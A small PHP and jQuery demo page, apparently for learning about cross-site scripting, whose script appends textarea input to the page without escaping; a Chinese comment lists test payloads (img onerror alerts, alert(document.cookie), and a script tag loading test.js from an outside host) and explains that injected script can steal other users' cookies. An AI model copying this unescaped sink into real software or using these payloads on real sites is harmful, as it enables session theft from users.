<?php
require 'public.php';
require 'head.php';
session_start();
?>

<textarea id="foo"></textarea>
<button onclick="commit()">commit</button>
<div id="blackboard">
    <div>history:</div>
</div>

<script>
function commit() {
	let content = $("#foo").val();
	console.log(content);
	$("#blackboard").append($(`<div>${content}</div>`));
	$("#foo").val("");
	
}
</script>

<!-- 

试验输入：
hi~
<img src="http://insights.thoughtworks.cn/wp-content/uploads/2017/10/XSS-700x424.png">
<img src="1" onerror="alert('you are under attack')">
<img src="1" onerror="alert(document.cookie)">
hi~<script>alert('you are under attack')"</script>
hi~<script src="http://www.test.com/test.js"></script>

原理：自己在输入中携带js，一旦在其他人的页面中显示，就会执行你留下的js，可以利用js获得他人的cookie

-->